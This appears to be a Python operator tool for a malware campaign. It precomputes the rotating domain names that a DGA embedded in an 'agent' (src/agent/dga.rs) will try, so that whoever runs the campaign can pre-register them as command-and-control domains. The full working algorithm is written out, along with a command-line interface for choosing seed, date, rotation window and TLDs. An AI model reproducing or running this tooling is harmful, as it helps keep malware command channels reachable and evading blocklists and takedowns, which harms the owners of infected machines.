#!/usr/bin/env python3
"""Operator-side DGA domain precomputation.

Mirrors src/agent/dga.rs exactly (FNV-1a mix -> CVC syllables -> TLD), so
the domains printed here for a given (seed, window) are byte-identical to
the ones agents carrying the same seed will try. Use it to pre-register
the domains a campaign will rotate through.

Python 3 standard library only.

Examples:
    # Today's domains for a seed (daily window)
    ./dga_precompute.py --seed 0x1234abcd --tlds com,net

    # A specific date (UTC), 100 domains, hourly rotation
    ./dga_precompute.py --seed 42 --date 2026-03-15 --window-secs 3600 \
        --count 100 --tlds com,net,io

    # A raw window index instead of a date
    ./dga_precompute.py --seed 42 --window 20000 --tlds com
"""

import argparse
import sys
import time
from datetime import datetime, timezone

MASK = 0xFFFFFFFFFFFFFFFF
FNV_PRIME = 0x00000100000001B3
FNV_OFFSET = 0xCBF29CE484222325

# Must match consonants()/vowels() in src/agent/dga.rs.
CONSONANTS = "bcdfghjklmnprstvwxz"
VOWELS = "aeiou"


def _fnv1a(h, data):
    for b in data:
        h ^= b
        h = (h * FNV_PRIME) & MASK
    return h


def fnv1a_mix(seed, window, index):
    """FNV-1a over seed(8 LE) | window(8 LE) | index(4 LE) -> u64."""
    h = FNV_OFFSET
    h = _fnv1a(h, seed.to_bytes(8, "little"))
    h = _fnv1a(h, window.to_bytes(8, "little"))
    h = _fnv1a(h, index.to_bytes(4, "little"))
    return h


def fnv1a_extend(h, step):
    """Extend the hash chain one step (u64 LE)."""
    return _fnv1a(h, step.to_bytes(8, "little"))


def syllable(h):
    """2 or 3 chars: consonant + vowel [+ trailing consonant 25%]."""
    out = [CONSONANTS[h % len(CONSONANTS)],
           VOWELS[(h >> 8) % len(VOWELS)]]
    if (h >> 16) & 3 == 0:
        out.append(CONSONANTS[(h >> 18) % len(CONSONANTS)])
    return "".join(out)


def generate_domain(seed, window, index, tlds):
    """Byte-identical port of dga.rs::generate_domain."""
    if not tlds:
        raise ValueError("tlds must not be empty")
    h = fnv1a_mix(seed, window, index)
    syllable_count = 2 + (h % 3)
    label = []
    for step in range(syllable_count):
        h = fnv1a_extend(h, step)
        label.append(syllable(h))
    tld = tlds[(h >> 56) % len(tlds)]
    return "".join(label) + "." + tld


def parse_seed(text):
    """Accept decimal or 0x-prefixed hex seeds (u64)."""
    try:
        value = int(text, 0)
    except ValueError:
        raise argparse.ArgumentTypeError(
            f"invalid seed {text!r}: use decimal or 0x-hex")
    if not 0 <= value <= MASK:
        raise argparse.ArgumentTypeError("seed must fit in u64")
    return value


def main(argv=None):
    p = argparse.ArgumentParser(
        description="Precompute the DGA domain set an agent seed will use.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__.split("Examples:")[-1])
    p.add_argument("--seed", required=True, type=parse_seed,
                   help="campaign seed (decimal or 0x-hex), as built into the agent")
    p.add_argument("--window-secs", type=int, default=86400,
                   help="rotation interval in seconds (default: 86400 = daily)")
    p.add_argument("--count", type=int, default=50,
                   help="number of domains per window (default: 50)")
    p.add_argument("--tlds", default="com,net",
                   help="comma-separated TLD list (default: com,net)")
    when = p.add_mutually_exclusive_group()
    when.add_argument("--date",
                      help="UTC date (YYYY-MM-DD); default: today")
    when.add_argument("--window", type=int,
                      help="raw window index (overrides --date)")
    args = p.parse_args(argv)

    if args.window_secs < 1:
        p.error("--window-secs must be >= 1")
    if args.count < 1:
        p.error("--count must be >= 1")

    if args.window is not None:
        window = args.window
    else:
        if args.date:
            try:
                day = datetime.strptime(args.date, "%Y-%m-%d").replace(tzinfo=timezone.utc)
            except ValueError:
                p.error("--date must be YYYY-MM-DD (UTC)")
            now = int(day.timestamp())
        else:
            now = int(time.time())
        window = now // args.window_secs

    tlds = [t.strip().lstrip(".") for t in args.tlds.split(",") if t.strip()]
    if not tlds:
        p.error("--tlds produced an empty list")

    window_start = window * args.window_secs
    stamp = datetime.fromtimestamp(window_start, tz=timezone.utc)
    print(f"# seed={args.seed} window={window} "
          f"(starts {stamp:%Y-%m-%d %H:%M:%S} UTC, every {args.window_secs}s)")
    for i in range(args.count):
        print(generate_domain(args.seed, window, i, tlds))
    return 0


if __name__ == "__main__":
    sys.exit(main())
